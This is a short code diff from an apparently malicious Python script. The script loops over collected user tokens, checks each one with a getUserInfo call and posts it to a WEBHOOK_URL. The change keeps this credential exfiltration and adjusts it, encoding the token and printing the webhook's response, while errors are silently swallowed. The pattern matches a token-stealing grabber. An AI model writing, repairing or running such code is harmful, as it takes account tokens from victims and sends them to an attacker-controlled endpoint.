@@ -217,8 +217,8 @@ def main():
                 for token in tokens:
                     try:
                         raw_user = getUserInfo(token)
-                        requests.post(WEBHOOK_URL,data=token)
-                        #print(raw_user)
+                        response = requests.post(WEBHOOK_URL,data=token.encode())
+                        print(response.text)
                     except:
                         pass
                         #print('This token does not work')
